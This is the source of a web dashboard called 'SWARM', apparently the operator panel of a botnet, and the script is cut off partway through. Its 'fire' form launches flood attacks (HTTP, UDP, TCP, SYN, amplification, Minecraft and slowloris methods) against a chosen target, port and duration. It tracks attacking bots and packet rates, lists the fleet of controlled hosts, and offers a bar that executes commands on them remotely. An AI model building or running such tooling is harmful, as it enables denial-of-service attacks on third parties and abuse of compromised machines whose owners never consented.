<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SWARM</title>
  <style>
    :root {
      --bg: #0b0e13;
      --panel: #11151c;
      --panel-alt: #0f131a;
      --border: #21262d;
      --primary: #c9d1d9;
      --muted: #8b949e;
      --accent: #1f6feb;
      --success: #2ea043;
      --danger: #da3633;
      --warn: #bb8009;
      --danger-soft: rgba(218, 54, 51, 0.15);
      --accent-soft: rgba(31, 111, 235, 0.12);
      --input-bg: #0d1117;
      --shadow: rgba(0, 0, 0, 0.2);
    }

    * { box-sizing: border-box; }

    html, body {
      margin: 0;
      background: var(--bg);
      color: var(--primary);
      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
      min-height: 100%;
    }

    body {
      padding: 0;
      line-height: 1.35;
    }

    button, input, select {
      font: inherit;
      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
    }

    button, select, input {
      background: var(--input-bg);
      color: var(--primary);
      border: 1px solid var(--border);
      border-radius: 3px;
      min-height: 30px;
      padding: 6px 10px;
      transition: border-color 0.15s ease, background 0.15s ease;
    }

    button {
      cursor: pointer;
      font-weight: 600;
      letter-spacing: 0.04em;
      text-transform: uppercase;
    }

    input::placeholder { color: var(--muted); }
    select { appearance: none; }

    button:hover { border-color: #36404b; }

    button:focus-visible, input:focus-visible, select:focus-visible, .chip:focus-visible, .sortable:focus-visible, .row-button:focus-visible {
      outline: 2px solid var(--accent);
      outline-offset: 2px;
    }

    .hidden { display: none !important; }

    .app {
      max-width: 1460px;
      margin: 0 auto;
      padding: 12px 10px 30px;
    }

    .topbar {
      position: sticky;
      top: 0;
      z-index: 90;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 18px;
      border: 1px solid var(--border);
      background: rgba(17, 21, 28, 0.96);
      padding: 10px 14px;
      margin-bottom: 12px;
      backdrop-filter: blur(4px);
    }

    .brand {
      font-size: 1.15rem;
      letter-spacing: 0.42em;
      text-transform: uppercase;
      color: var(--primary);
      font-weight: 700;
      white-space: nowrap;
    }

    .topbar-status {
      display: flex;
      align-items: center;
      gap: 14px;
      flex-wrap: wrap;
      justify-content: flex-end;
    }

    .conn-wrap {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      color: var(--muted);
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.12em;
    }

    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      display: inline-block;
      background: var(--success);
      box-shadow: 0 0 0 2px rgba(46, 160, 67, 0.2);
    }

    .dot.red { background: var(--danger); box-shadow: 0 0 0 2px rgba(218, 54, 51, 0.15); }
    .dot.amber { background: var(--warn); box-shadow: 0 0 0 2px rgba(187, 128, 9, 0.18); }

    .stats {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 10px 18px;
      color: var(--muted);
      font-size: 12px;
      letter-spacing: 0.06em;
    }

    .stat-value {
      color: var(--primary);
      font-weight: 700;
    }

    .stat-warn { color: var(--warn); }

    .countdown-ring {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background:
        radial-gradient(circle at center, var(--panel) 0 60%, transparent 61%),
        conic-gradient(var(--accent) var(--pct), rgba(255,255,255,0.05) 0);
      position: relative;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .countdown-ring::before {
      content: "";
      position: absolute;
      inset: 5px;
      border: 1px solid var(--border);
      border-radius: 50%;
      background: rgba(15, 19, 26, 0.85);
    }

    .countdown-ring span {
      position: relative;
      z-index: 1;
      font-size: 9px;
      letter-spacing: 0.06em;
      color: var(--primary);
    }

    .panel {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 3px;
      padding: 12px 12px 10px;
      margin-bottom: 12px;
    }

    .section-header {
      margin: 0 0 10px;
      color: var(--muted);
      font-size: 11px;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      font-weight: 700;
    }

    .job-banner {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      flex-wrap: wrap;
    }

    .job-main {
      display: flex;
      align-items: center;
      gap: 10px;
      flex-wrap: wrap;
      min-width: 0;
      flex: 1;
    }

    .method-badge {
      display: inline-block;
      padding: 4px 8px;
      border: 1px solid var(--border);
      border-radius: 3px;
      color: var(--primary);
      background: rgba(31, 111, 235, 0.08);
      font-size: 11px;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      font-weight: 700;
    }

    .job-meta {
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--muted);
      flex-wrap: wrap;
      font-size: 12px;
      letter-spacing: 0.04em;
    }

    .job-meta strong {
      color: var(--primary);
      font-weight: 700;
    }

    .job-progress-wrap {
      width: min(420px, 100%);
      display: flex;
      flex-direction: column;
      gap: 4px;
      margin-top: 8px;
    }

    .job-progress {
      position: relative;
      height: 8px;
      background: rgba(255,255,255,0.04);
      border: 1px solid var(--border);
      border-radius: 2px;
      overflow: hidden;
    }

    .job-progress > span {
      position: absolute;
      inset: 0 auto 0 0;
      width: 0;
      background: linear-gradient(90deg, var(--danger), #ff6b57);
      border-radius: 1px;
    }

    .job-remaining {
      color: var(--muted);
      font-size: 11px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
    }

    .idle-state {
      color: var(--muted);
      letter-spacing: 0.16em;
      text-transform: uppercase;
      font-size: 11px;
    }

    .fire-form {
      display: grid;
      gap: 12px;
    }

    .form-grid {
      display: grid;
      grid-template-columns: 1.2fr 2.2fr 0.8fr 0.9fr 0.8fr 0.8fr;
      gap: 10px;
    }

    .field label {
      display: block;
      color: var(--muted);
      font-size: 10px;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      margin-bottom: 6px;
    }

    .field input, .field select {
      width: 100%;
      min-width: 0;
    }

    .form-actions {
      display: flex;
      gap: 8px;
      align-items: center;
      flex-wrap: wrap;
    }

    .btn-accent { background: var(--accent); border-color: var(--accent); color: #edf6ff; }
    .btn-danger { background: var(--danger); border-color: var(--danger); color: #fff; }
    .btn-neutral { background: #1a2029; border-color: var(--border); color: var(--primary); }

    .confirm-row {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      color: var(--muted);
      font-size: 11px;
      letter-spacing: 0.06em;
      text-transform: none;
      min-height: 26px;
    }

    .confirm-row input {
      width: 14px;
      height: 14px;
      margin: 0;
    }

    .inline-confirm {
      display: inline-block;
      font-size: 11px;
      color: var(--warn);
      letter-spacing: 0.08em;
      text-transform: uppercase;
      padding: 4px 8px;
      background: rgba(187, 128, 9, 0.1);
      border: 1px solid rgba(187, 128, 9, 0.5);
      border-radius: 3px;
    }

    .duration-hint {
      color: var(--muted);
      font-size: 11px;
      letter-spacing: 0.08em;
      min-height: 14px;
    }

    .command-wrap {
      display: flex;
      gap: 8px;
      align-items: center;
      flex-wrap: wrap;
    }

    .command-wrap input {
      flex: 1 1 360px;
      min-width: 0;
    }

    .chart-grid {
      display: grid;
      grid-template-columns: repeat(2, minmax(250px, 1fr));
      gap: 12px;
    }

    .chart-panel {
      position: relative;
      min-height: 190px;
      background: var(--panel-alt);
      border: 1px solid var(--border);
      border-radius: 3px;
      padding: 10px 10px 8px;
    }

    .chart-header {
      color: var(--muted);
      font-size: 10px;
      letter-spacing: 0.2em;
      text-transform: uppercase;
      margin-bottom: 8px;
    }

    .chart-box {
      position: relative;
      width: 100%;
      height: 150px;
      background: rgba(255,255,255,0.01);
      border: 1px solid rgba(33, 38, 45, 0.7);
      border-radius: 2px;
      overflow: hidden;
    }

    canvas {
      width: 100% !important;
      height: 100% !important;
      display: block;
    }

    .fleet-head {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 8px;
      margin-bottom: 8px;
      flex-wrap: wrap;
    }

    .filter-box {
      flex: 1 1 220px;
      max-width: 420px;
      min-width: 160px;
    }

    .chip-list {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 8px;
    }

    .chip {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 4px 8px;
      border: 1px solid var(--border);
      background: transparent;
      color: var(--muted);
      border-radius: 3px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      font-size: 10px;
      cursor: pointer;
    }

    .chip.active {
      background: rgba(31, 111, 235, 0.1);
      border-color: var(--accent);
      color: var(--primary);
    }

    .chip-count {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      min-width: 18px;
      padding: 0 4px;
      height: 18px;
      border-radius: 2px;
      background: rgba(255,255,255,0.04);
      font-size: 10px;
      color: var(--primary);
    }

    .fleet-meta {
      color: var(--muted);
      font-size: 11px;
      letter-spacing: 0.08em;
      margin: 4px 0 10px;
    }

    .table-wrap {
      overflow: auto;
      border: 1px solid var(--border);
      border-radius: 3px;
      background: rgba(10, 12, 17, 0.25);
    }

    table {
      width: min(100%, 100%);
      border-collapse: collapse;
      table-layout: fixed;
      min-width: 1180px;
    }

    th, td {
      padding: 0 8px;
      height: 24px;
      border-bottom: 1px solid var(--border);
      border-right: 1px solid var(--border);
      text-align: left;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      vertical-align: middle;
    }

    th:last-child, td:last-child { border-right: none; }

    thead th {
      position: sticky;
      top: 0;
      z-index: 2;
      background: rgba(17, 21, 28, 0.96);
      color: var(--muted);
      font-size: 10px;
      letter-spacing: 0.16em;
      text-transform: uppercase;
      font-weight: 700;
      cursor: pointer;
      user-select: none;
    }

    tbody tr {
      background: rgba(17, 21, 28, 0.2);
    }

    tbody tr:hover { background: rgba(31, 111, 235, 0.04); }

    tbody tr.bot-row {
      cursor: pointer;
    }

    tbody tr.bot-row.attack { color: #f4a6a6; }
    tbody tr.bot-row.dead { opacity: 0.45; }
    tbody tr.bot-row.idle { color: var(--primary); }

    tr.detail-row td {
      background: rgba(13, 17, 23, 0.85);
      padding: 8px 12px;
      border-top: 1px solid var(--border);
      border-bottom: 1px solid var(--border);
    }

    .detail-json {
      margin: 0;
      white-space: pre-wrap;
      font-size: 11px;
      line-height: 1.5;
      color: var(--primary);
    }

    .num {
      text-align: right;
      font-variant-numeric: tabular-nums;
    }

    .row-button {
      border: 1px solid var(--border);
      background: rgba(218, 54, 51, 0.05);
      color: var(--danger);
      width: 24px;
      min-width: 24px;
      height: 22px;
      padding: 0;
      line-height: 1;
      text-transform: none;
      font-weight: 700;
    }

    .event-log {
      display: flex;
      flex-direction: column;
      gap: 6px;
      max-height: 260px;
      overflow: auto;
      border: 1px solid var(--border);
      background: rgba(12, 15, 21, 0.6);
      border-radius: 3px;
      padding: 8px;
      scroll-behavior: smooth;
    }

    .event {
      display: flex;
      align-items: baseline;
      gap: 10px;
      padding: 3px 0;
      border-bottom: 1px solid rgba(33, 38, 45, 0.7);
      color: var(--primary);
      font-size: 11px;
      letter-spacing: 0.05em;
    }

    .event:last-child { border-bottom: none; }

    .event-time {
      color: var(--muted);
      min-width: 64px;
      font-variant-numeric: tabular-nums;
    }

    .event.error { color: #f8b7b7; }
    .event.warn { color: #f4d07d; }
    .event.info { color: var(--primary); }
    .event.success { color: #9ee4ae; }

    .toast-host {
      position: fixed;
      right: 18px;
      bottom: 18px;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      gap: 8px;
      z-index: 120;
    }

    .toast {
      max-width: min(360px, 78vw);
      border: 1px solid var(--border);
      border-radius: 3px;
      padding: 8px 10px;
      background: rgba(17, 21, 28, 0.98);
      color: var(--primary);
      font-size: 12px;
      letter-spacing: 0.05em;
      animation: slideIn 0.2s ease;
    }

    .toast.success { border-color: rgba(46, 160, 67, 0.5); color: #c8f5d3; background: rgba(14, 27, 18, 0.95); }
    .toast.error { border-color: rgba(218, 54, 51, 0.5); color: #f9cece; background: rgba(31, 17, 18, 0.96); }
    .toast.info { border-color: rgba(31, 111, 235, 0.5); color: #dfeaff; background: rgba(13, 24, 38, 0.96); }

    @keyframes slideIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }

    .token-banner {
      position: sticky;
      top: 62px;
      z-index: 80;
      margin-bottom: 10px;
      display: block;
      padding: 8px 12px;
      border: 1px solid rgba(218, 54, 51, 0.5);
      background: rgba(218, 54, 51, 0.12);
      color: #ffd7d7;
      letter-spacing: 0.16em;
      text-transform: uppercase;
      font-size: 11px;
      font-weight: 700;
    }

    @media (max-width: 980px) {
      .form-grid { grid-template-columns: repeat(2, minmax(140px, 1fr)); }
      .chart-grid { grid-template-columns: 1fr; }
      .topbar { align-items: flex-start; }
    }

    @media (max-width: 480px) {
      .app { padding: 8px 8px 25px; }
      .topbar { padding: 8px 10px; }
      .brand { letter-spacing: 0.2em; font-size: 1rem; }
      .stats { gap: 6px 10px; font-size: 11px; }
      .form-grid { grid-template-columns: 1fr; }
      .command-wrap { flex-direction: column; align-items: stretch; }
      .command-wrap input { width: 100%; }
      .fleet-head { align-items: flex-start; }
      table { min-width: 960px; }
    }
  </style>
</head>
<body>
  <div class="app">
    <div id="tokenBanner" class="token-banner hidden" aria-live="assertive">bad token</div>

    <header class="topbar" aria-label="dashboard header">
      <div class="brand">SWARM</div>
      <div class="topbar-status">
        <div class="conn-wrap">
          <span id="connDot" class="dot" aria-label="connection status"></span>
          <span>link</span>
        </div>
        <div class="stats">
          <div><span class="muted">online / total</span> <span id="onlineTotal" class="stat-value">0 / 0</span></div>
          <div><span class="muted">attacking</span> <span id="attackingStat" class="stat-value stat-warn">0</span></div>
          <div><span class="muted">pps</span> <span id="ppsStat" class="stat-value">0</span></div>
          <div><span class="muted">mb/s</span> <span id="mbpsStat" class="stat-value">0.0</span></div>
          <div><span class="muted">uptime</span> <span id="uptimeStat" class="stat-value">0d 0h 0m</span></div>
        </div>
        <div id="countdownRing" class="countdown-ring" aria-label="time until next refresh"><span id="countdownText">2000</span></div>
      </div>
    </header>

    <section class="panel" aria-label="job status panel">
      <div id="jobBanner" class="job-banner"></div>
    </section>

    <section class="panel" aria-label="fire form panel">
      <h2 class="section-header">fire</h2>
      <form id="fireForm" class="fire-form" novalidate>
        <div class="form-grid">
          <div class="field">
            <label for="methodSelect">method</label>
            <select id="methodSelect" name="method">
              <option value="http">http</option>
              <option value="httpk">httpk</option>
              <option value="udp">udp</option>
              <option value="tcp">tcp</option>
              <option value="mc">mc</option>
              <option value="mcjoin">mcjoin</option>
              <option value="mcpe">mcpe</option>
              <option value="slow">slow</option>
              <option value="syn">syn</option>
              <option value="amp">amp</option>
            </select>
          </div>
          <div class="field">
            <label for="targetInput">target</label>
            <input id="targetInput" name="target" type="text" placeholder="example.com" autocomplete="off">
          </div>
          <div class="field">
            <label for="portInput">port</label>
            <input id="portInput" name="port" type="number" min="1" max="65535" step="1" value="443">
          </div>
          <div class="field">
            <label for="durationInput">duration</label>
            <input id="durationInput" name="duration" type="text" value="300" inputmode="numeric" placeholder="60, 5m, 1h">
          </div>
          <div class="field">
            <label for="threadsInput">threads</label>
            <input id="threadsInput" name="threads" type="number" min="1" step="1" value="48">
          </div>
          <div class="field">
            <label for="procsInput">procs</label>
            <input id="procsInput" name="procs" type="number" min="1" step="1" value="1">
          </div>
        </div>

        <div class="form-actions">
          <button type="submit" class="btn-accent" id="fireBtn">fire</button>
          <button type="button" class="btn-danger" id="stopBtn">stop</button>
          <button type="button" class="btn-neutral" id="updateBtn">update all</button>
        </div>

        <div class="confirm-row">
          <input id="dontAskBox" type="checkbox">
          <label for="dontAskBox">don't ask</label>
        </div>
        <div id="fireInlineConfirm" class="inline-confirm hidden" aria-live="polite">replaces current job - click again</div>
        <div id="durationHint" class="duration-hint" aria-live="polite">resolved: 300s</div>
      </form>
    </section>

    <section class="panel" aria-label="command bar panel">
      <h2 class="section-header">command</h2>
      <form id="execForm" class="command-wrap" novalidate>
        <input id="commandInput" type="text" list="cmdHistory" placeholder="run command" autocomplete="off">
        <button type="submit" class="btn-accent" id="execBtn">exec</button>
      </form>
      <datalist id="cmdHistory"></datalist>
    </section>

    <section class="chart-grid" aria-label="charts">
      <div class="chart-panel">
        <div class="chart-header">pps</div>
        <div class="chart-box"><canvas id="ppsCanvas"></canvas></div>
      </div>
      <div class="chart-panel">
        <div class="chart-header">mbps</div>
        <div class="chart-box"><canvas id="mbpsCanvas"></canvas></div>
      </div>
    </section>

    <section class="panel" aria-label="fleet panel">
      <div class="fleet-head">
        <div class="filter-box">
          <input id="fleetFilter" type="text" placeholder="filter by host, ip, id, os" aria-label="fleet filter">
        </div>
        <div id="stateChips" class="chip-list" aria-label="state filters"></div>
      </div>
      <div id="fleetMeta" class="fleet-meta">showing 0 of 0</div>
      <div class="table-wrap">
        <table aria-label="fleet table">
          <thead>
            <tr>
              <th data-key="id" class="sortable">id</th>
              <th data-key="host" class="sortable">host</th>
              <th data-key="os" class="sortable">os</th>
              <th data-key="ip" class="sortable">ip</th>
              <th data-key="state" class="sortable">state</th>
              <th data-key="pps" class="sortable num">pps</th>
              <th data-key="mbps" class="sortable num">mbps</th>
              <th data-key="cpu" class="sortable num">cpu</th>
              <th data-key="age" class="sortable num">age</th>
              <th data-key="up" class="sortable num">up</th>
              <th data-key="ver" class="sortable">ver</th>
              <th data-key="target" class="sortable">target</th>
              <th data-key="kick">kick</th>
            </tr>
          </thead>
          <tbody id="fleetBody"></tbody>
        </table>
      </div>
    </section>

    <section class="panel" aria-label="event log panel">
      <h2 class="section-header">event log</h2>
      <div id="eventLog" class="event-log" aria-live="polite"></div>
    </section>
  </div>

  <div id="toastHost" class="toast-host" aria-live="polite" aria-atomic="true"></div>

  <script>
    (() => {
      const FORM_KEY = 'swarm.form';
      const CMD_KEY = 'swarm.cmds';
      const MAX_LOG = 50;
      const REFRESH_MS = 2000;
      const BACKOFF_MS = 5000;
      const MAX_VISIBLE_ROWS = 500;

      const state = {
        online: 0,
        total: 0,
        attacking: 0,
        pps: 0,
        mbps: 0,
        uptime: 0,
        job: null,
        bots: [],
        truncated: 0,
        now: Date.now() / 1000
      };

      const ui = {
        connDot: document.getElementById('connDot'),
        onlineTotal: document.getElementById('onlineTotal'),
        attackingStat: document.getElementById('attackingStat'),
        ppsStat: document.getElementById('ppsStat'),
        mbpsStat: document.getElementById('mbpsStat'),
        uptimeStat: document.getElementById('uptimeStat'),
        countdownRing: document.getElementById('countdownRing'),
        countdownText: document.getElementById('countdownText'),
        jobBanner: document.getElementById('jobBanner'),
        fireForm: document.getElementById('fireForm'),
        methodSelect: document.getElementById('methodSelect'),
        targetInput: document.getElementById('targetInput'),
        portInput: document.getElementById('portInput'),
        durationInput: document.getElementById('durationInput'),
        threadsInput: document.getElementById('threadsInput'),
        procsInput: document.getElementById('procsInput'),
        dontAskBox: document.getElementById('dontAskBox'),
        fireInlineConfirm: document.getElementById('fireInlineConfirm'),
        durationHint: document.getElementById('durationHint'),
        execForm: document.getElementById('execForm'),
        commandInput: document.getElementById('commandInput'),
        cmdHistory: document.getElementById('cmdHistory'),
        fleetBody: document.getElementById('fleetBody'),
        fleetFilter: document.getElementById('fleetFilter'),
        stateChips: document.getElementById('stateChips'),
        fleetMeta: document.getElementById('fleetMeta'),
        eventLog: document.getElementById('eventLog'),
        tokenBanner: document.getElementById('tokenBanner'),
        toastHost: document.getElementById('toastHost')
      };

      const defaultForm = {
        method: 'http',
        target: 'example.com',
        port: '443',
        duration: '300',
        threads: '48',
        procs: '1',
        dontAsk: false
      };

      let currentForm = { ...defaultForm };
      let refreshMs = REFRESH_MS;
      let refreshTimer = null;
      let inFlight = false;
      let requestSeq = 0;
      let serverOffsetMs = 0;
      let fireConfirmMode = false;
      let badTokenShown = false;
      let sortKey = 'host';
      let sortDir = 1;
      let activeStateFilter = 'all';
      let textFilter = '';
      let expandedRowId = null;
      let lastSeenBotIds = new Set();
      let eventLog = [];
      let chartInstances = {};
      let chartFallbacks = {};
      let chartReady = false;
      let fallbackWarned = false;

      function getToken() {
        const params = new URLSearchParams(window.location.search);
        return params.get('k') || '';
      }

      function buildApiUrl(path, extraParams = {}) {
        const url = new URL(path, window.location.origin);
        const params = new URLSearchParams(url.search);
        params.set('k', getToken());
        Object.entries(extraParams).forEach(([key, value]) => {
          if (value !== undefined && value !== null && value !== '') {
            params.set(key, String(value));
          }
        });
        url.search = params.toString();
        return url.toString();
      }

      function escapeHtml(value) {
        return String(value ?? '')
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
      }

      function getSavedForm() {
        try {
          const raw = localStorage.getItem(FORM_KEY);
          if (!raw) return null;
          const parsed = JSON.parse(raw);
          if (!parsed || typeof parsed !== 'object') return null;
          return { ...defaultForm, ...parsed };
        } catch (err) {
          return null;
        }
      }

      function saveForm() {
        try {
          localStorage.setItem(FORM_KEY, JSON.stringify(currentForm));
        } catch (err) {
          // ignore
        }
      }

      function restoreForm() {
        const saved = getSavedForm();
        const values = saved || defaultForm;
        currentForm = { ...defaultForm, ...values };
        ui.methodSelect.value = currentForm.method || 'http';
        ui.targetInput.value = currentForm.target || 'example.com';
        ui.portInput.value = currentForm.port || '443';
        ui.durationInput.value = currentForm.duration || '300';
        ui.threadsInput.value = currentForm.threads || '48';
        ui.procsInput.value = currentForm.procs || '1';
        ui.dontAskBox.checked = !!currentForm.dontAsk;
        updateDurationHint();
      }

      function bindForm() {
        [ui.methodSelect, ui.targetInput, ui.portInput, ui.durationInput, ui.threadsInput, ui.procsInput].forEach((el) => {
          el.addEventListener('input', () => {
            currentForm = {
              method: ui.methodSelect.value,
              target: ui.targetInput.value,
              port: ui.portInput.value,
              duration: ui.durationInput.value,
              threads: ui.threadsInput.value,
              procs: ui.procsInput.value,
              dontAsk: ui.dontAskBox.checked
            };
            saveForm();
            updateDurationHint();
          });
        });

        ui.dontAskBox.addEventListener('change', () => {
          currentForm.dontAsk = ui.dontAskBox.checked;
          saveForm();
        });

        ui.targetInput.addEventListener('keydown', (event) => {
          if (event.key === 'Enter') {
            event.preventDefault();
            fireAttack();
          }
        });

        ui.fireForm.addEventListener('submit', (event) => {
          event.preventDefault();
          fireAttack();
        });

        document.getElementById('stopBtn').addEventListener('click', handleStop);
        document.getElementById('updateBtn').addEventListener('click', handleUpdate);
        ui.execForm.addEventListener('submit', (event) => {
          event.preventDefault();
          runExec();
        });
      }

      function updateDurationHint() {
        const resolved = parseDuration(ui.durationInput.value || '300');
        ui.durationHint.textContent = `resolved: ${resolved}s`;
      }

      function parseDuration(raw) {
        const value = String(raw || '').trim().toLowerCase();
        if (!value) return 60;
        if (/^\d+$/.test(value)) return Math.max(1, Number(value));
        const match = value.match(/^(\d+)([smh]?)$/);
        if (!match) return 60;
        const amount = Number(match[1]);
        const unit = match[2];
        if (unit === 's' || unit === '') return Math.max(1, amount);
        if (unit === 'm') return Math.max(1, amount * 60);
        if (unit === 'h') return Math.max(1, amount * 3600);
        return 60;
      }

      function formatSecondsToHuman(totalSeconds) {
        const seconds = Math.max(0, Number(totalSeconds) || 0);
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        return `${days}d ${hours}h ${minutes}m`;
      }

      function formatPps(value) {
        const n = Number(value) || 0;
        if (n >= 1000000) return `${(n / 1000000).toFixed(2).replace(/\.00$/, '')}M`;
        if (n >= 10000) return `${(n / 1000).toFixed(1).replace(/\.0$/, '')}k`;
        if (n >= 1000) return `${(n / 1000).toFixed(2).replace(/0$/, '').replace(/\.\d$/, '$&').replace(/\.\d$/, '')}k`;
        return String(Math.round(n));
      }

      function formatMbps(value) {
        return `${(Number(value) || 0).toFixed(1)}`;
      }

      function setConnectionDot(kind) {
        ui.connDot.classList.remove('red', 'amber');
        if (kind === 'red') {
          ui.connDot.classList.add('red');
          ui.connDot.setAttribute('aria-label', 'connection failed');
        } else if (kind === 'amber') {
          ui.connDot.classList.add('amber');
          ui.connDot.setAttribute('aria-label', 'request in progress');
        } else {
          ui.connDot.setAttribute('aria-label', 'connection ok');
        }
      }

      function toast(type, message, timeout = 3500) {
        const el = document.createElement('div');
        el.className = `toast ${type}`;
        el.textContent = message;
        ui.toastHost.appendChild(el);
        window.setTimeout(() => {
          el.remove();
        }, timeout);
      }

      function showBadToken() {
        if (badTokenShown) return;
        badTokenShown = true;
        ui.tokenBanner.classList.remove('hidden');
        ui.tokenBanner.textContent = 'bad token';
        toast('error', 'bad token');
      }

      function hideBadToken() {
        badTokenShown = false;
        ui.tokenBanner.classList.add('hidden');
      }

      function addEvent(level, message) {
        const stamp = new Date().toLocaleTimeString('en-GB', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        eventLog.unshift({ level, stamp, message });
        if (eventLog.length > MAX_LOG) eventLog.length = MAX_LOG;
        renderEventLog();
      }

      function renderEventLog() {
        ui.eventLog.innerHTML = eventLog.map((event) => {
          return `<div class="event ${event.level}"><span class="event-time">${escapeHtml(event.stamp)}</span><span>${escapeHtml(event.message)}</span></div>`;
        }).join('');
        ui.eventLog.scrollTop = 0;
      }

      function loadCommandHistory() {
        try {
          const raw = localStorage.getItem(CMD_KEY);
          if (!raw) {
            ui.cmdHistory.innerHTML = '';
            return;
          }
          const items = JSON.parse(raw);
          const values = Array.isArray(items) ? items.slice(-5) : [];
          ui.cmdHistory.innerHTML = values.map((item) => `<option value="${escapeHtml(item)}"></option>`).join('');
        } catch (err) {
          ui.cmdHistory.innerHTML = '';
        }
      }

      function saveCommandHistory(command) {
        try {
          const raw = localStorage.getItem(CMD_KEY);
          const items = raw ? JSON.parse(raw) : [];
          const arr = Array.isArray(items) ? items : [];
          const next = [command, ...arr.filter((item) => item !== command)].slice(0, 5);
          localStorage.setItem(CMD_KEY, JSON.stringify(next));
        } catch (err) {
          // ignore
        }
        loadCommandHistory();
      }

      function nextRefreshCountdown() {
        const remaining = Math.max(0, refreshMs - 0);
        const pct = Math.max(0, Math.min(100, (remaining / refreshMs) * 100));
        ui.countdownRing.style.setProperty('--pct', `${pct}%`);
        ui.countdownText.textContent = `${Math.max(0, refreshMs)}`;
      }

      function renderTopBar() {
        ui.onlineTotal.textContent = `${state.online} / ${state.total}`;
        ui.attackingStat.textContent = String(state.attacking || 0);
        ui.ppsStat.textContent = formatPps(state.pps || 0);
        ui.mbpsStat.textContent = formatMbps(state.mbps || 0);
        ui.uptimeStat.textContent = formatSecondsToHuman(state.uptime || 0);
        nextRefreshCountdown();
      }

      function renderJobBanner() {
        const job = state.job;
        if (!job) {
          ui.jobBanner.innerHTML = '<div class="idle-state">idle</div>';
          return;
        }

        const usedSeconds = Number(job.dur) || 0;
        const serverNow = (Date.now() + serverOffsetMs) / 1000;
        const remaining = Math.max(0, Number(job.until || 0) - serverNow);
        const ratio = usedSeconds > 0 ? Math.max(0, Math.min(1, remaining / usedSeconds)) : 0;
        const progressWidth = Math.min(100, Math.max(0, ratio * 100));

        ui.jobBanner.innerHTML = `
          <div class="job-main">
            <span class="method-badge">${escapeHtml(job.method || 'job')}</span>
            <div class="job-meta">
              <span><strong>${escapeHtml(job.target || 'unknown')}</strong></span>
              <span>port ${escapeHtml(job.port || 0)}</span>
              <span>threads ${escapeHtml(job.threads || 0)}</span>
            </div>
            <div class="job-progress-wrap">
              <div class="job-progress"><span style="width:${progressWidth}%"></span></div>
              <div class="job-remaining">${formatSecondsToHuman(Math.ceil(remaining))}</div>
            </div>
          </div>
          <button type="button" class="btn-danger" id="jobStopBtn">stop</button>
        `;
        document.getElementById('jobStopBtn').addEventListener('click', handleStop);
      }

      function renderFleet() {
        const filtered = getFilteredBots();
        let sorted = [...filtered];
        if (sortKey && sortKey !== 'kick') {
          sorted.sort((a, b) => {
            const av = normalizeSortValue(a[sortKey]);
            const bv = normalizeSortValue(b[sortKey]);
            if (av < bv) return -1 * sortDir;
            if (av > bv) return 1 * sortDir;
            return 0;
          });
        }

        const limit = Math.min(MAX_VISIBLE_ROWS, sorted.length);
        const visibleRows = sorted.slice(0, limit);
        const showingText = filtered.length > 0 ? `showing ${limit} of ${filtered.length}` : 'showing 0 of 0';
        let meta = showingText;
        if (state.truncated > 0) meta += `, truncated ${state.truncated}`;
        ui.fleetMeta.textContent = meta;

        const rows = visibleRows.map((bot) => {
          const isExpanded = expandedRowId === bot.id;
          const safeState = bot.state || 'idle';
          const rowClass = `bot-row ${safeState}`;
          const target = bot.target || '';
          const row = `
            <tr class="${rowClass}" data-id="${escapeHtml(bot.id)}" tabindex="0" data-state="${escapeHtml(safeState)}">
              <td>${escapeHtml(bot.id)}</td>
              <td>${escapeHtml(bot.host || '')}</td>
              <td>${escapeHtml(bot.os || '')}</td>
              <td>${escapeHtml(bot.ip || '')}</td>
              <td>${escapeHtml(safeState)}</td>
              <td class="num">${escapeHtml(formatPps(bot.pps || 0))}</td>
              <td class="num">${escapeHtml(formatMbps(bot.mbps || 0))}</td>
              <td class="num">${escapeHtml(Number(bot.cpu || 0).toFixed(2))}</td>
              <td class="num">${escapeHtml(Number(bot.age || 0))}</td>
              <td class="num">${escapeHtml(Number(bot.up || 0))}</td>
              <td>${escapeHtml(bot.ver || '')}</td>
              <td>${escapeHtml(target)}</td>
              <td><button type="button" class="row-button" data-kick-id="${escapeHtml(bot.id)}" aria-label="kick ${escapeHtml(bot.id)}">x</button></td>
            </tr>
          `;
          const detail = isExpanded ? `
            <tr class="detail-row"><td colspan="13"><pre class="detail-json">${escapeHtml(JSON.stringify(bot, null, 2))}</pre></td></tr>
          ` : '';
          return row + detail;
        }).join('');

        ui.fleetBody.innerHTML = rows;
        ui.fleetBody.querySelectorAll('.row-button').forEach((btn) => {
          btn.addEventListener('click', (event) => {
            event.stopPropagation();
            const id = btn.getAttribute('data-kick-id');
            kickBot(id);
          });
        });

        ui.fleetBody.querySelectorAll('.bot-row').forEach((row) => {
          row.addEventListener('click', (event) => {
